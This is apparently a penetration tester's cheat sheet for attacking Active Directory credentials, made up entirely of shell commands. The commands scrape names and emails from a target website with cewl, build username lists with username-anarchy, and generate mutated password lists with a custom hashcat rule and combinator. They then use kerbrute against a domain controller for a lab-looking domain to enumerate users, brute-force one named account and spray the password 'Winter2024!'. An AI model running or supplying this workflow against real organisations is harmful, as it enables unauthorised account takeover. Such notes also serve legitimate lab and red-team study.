# Username Wordlist
```
# Potential Usernames
cewl https://target.com --email | cut -d@ -f1 > first_last-name.txt

# Valid Username Wordlist Generator
cat first_last-name.txt | sort -u | sed '/^$/d' > clean_names.txt
ruby username-anarchy -i clean_names.txt > users_wordlist
ruby username-anarchy -i clean_names.txt --select-format first.last > users_wordlist2
ruby username-anarchy -i clean_names.txt --select-format firstlast >> users_wordlist2
```

# Email Wordlist
```
# Potential Emails
cewl https://target.com --email -w emails.txt

# Domain Suffix
ruby username-anarchy -i names.txt --select-format flast --suffix @warzone.oxsium.local > emails.txt
```

# Password Generator
```
Make base wordlist --> first_last-name.txt


# Make Hashcat Rule
echo ':\nc\nC\nt\nl\nf\nr\np\n\nso0\nc so0\nC so0\nt so0\nl so0\nf so0\nr so0\np so0\n\nsa@\nc sa@\nC sa@\nt sa@\nl sa@\nf sa@\nr sa@\np sa@\n\nc sa@ so0\nC sa@ so0\nt sa@ so0\nl sa@ so0\nf sa@ so0\nr sa@ so0\np sa@ so0\n\nc so0 sa@\nC so0 sa@\nt so0 sa@\nl so0 sa@\nf so0 sa@\nr so0 sa@\np so0 sa@\n\n$!\n$@\n$! c\n$@ c\n$! C\n$@ C\n$! t\n$@ t\n$! l\n$@ l\n$! f\n$@ f\n$! r\n$@ r\n$! p\n$@ p\n\n$! so0\n$@ so0\n$! sa@\n$@ sa@\n\n$! c so0\n$! C so0\n$! t so0\n$! l so0\n$! f so0\n$! r so0\n$! p so0\n\n$@ c so0\n$@ C so0\n$@ t so0\n$@ l so0\n$@ f so0\n$@ r so0\n$@ p so0\n\n$! c sa@\n$! C sa@\n$! t sa@\n$! l sa@\n$! f sa@\n$! r sa@\n$! p sa@\n\n$@ c sa@\n$@ C sa@\n$@ t sa@\n$@ l sa@\n$@ f sa@\n$@ r sa@\n$@ p sa@\n\n$! so0 sa@\n$! sa@ so0\n$@ so0 sa@\n$@ sa@ so0\n\n$! c so0 sa@\n$! C so0 sa@\n$! t so0 sa@\n$! l so0 sa@\n$! f so0 sa@\n$! r so0 sa@\n$! p so0 sa@\n\n$@ c so0 sa@\n$@ C so0 sa@\n$@ t so0 sa@\n$@ l so0 sa@\n$@ f so0 sa@\n$@ r so0 sa@\n$@ p so0 sa@\n' > custom.rule


# Combination of two parameters
combinator base_word.txt base_word.txt > combined_2_raw.txt
echo 'c' > cap.rule
hashcat --stdout -r cap.rule combined_2_raw.txt >> combined_2_raw.txt
sort -u combined_2_raw.txt > combined_2.txt


# Combination of three parameters
combinator base_word.txt base_word.txt > temp_2.txt
combinator temp_2.txt base_word.txt > combined_3_raw.txt
hashcat --stdout -r cap.rule combined_3_raw.txt >> combined_3_raw.txt
sort -u combined_3_raw.txt > combined_3.txt


# Combining combinations
cat base_word.txt combined_3.txt combined_2.txt > all_combined.txt


# Creating unique values
sort -u all_combined.txt > all_combined_uniq.txt


# Create the first mutated wordlist based on the rule
hashcat -r custom.rule base_word.txt --stdout > mut1.txt


# Create the second mutated wordlist based on the rule
hashcat -r custom.rule combined_2.txt --stdout > mut2.txt


# Create the third mutated wordlist based on the rule
hashcat -r custom.rule combined_3.txt --stdout > mut3.txt


# Combining mutated wordlists
hashcat -r custom.rule all_combined_uniq.txt --stdout > mut_final.txt


# Making a combined mutation unique
cat all_combined_uniq.txt combined_2.txt combined_3.txt base_word.txt mut1.txt mut2.txt mut3.txt mut_final.txt | sort -u > mut_password.list


# Create final Passwordlist
cat mut_password.list | awk 'length($0) >= 8 && length($0) <= 20' > final.list
```

# Kerbrute
```
# Valid Usernames
./kerbrute userenum --dc 192.168.0.239 -d warzone.oxsium.local /home/sako/Special-Tools/Active-Directory/username-anarchy/users_wordlist

# Password Brute Force
./kerbrute bruteuser --dc 192.168.0.239 -d warzone.oxsium.local /usr/share/wordlists/rockyou.txt jkimmich

# All User brute Force
./kerbrute passwordspray --dc 192.168.0.239 -d warzone.oxsium.local valid_users.txt 'Winter2024!'
```


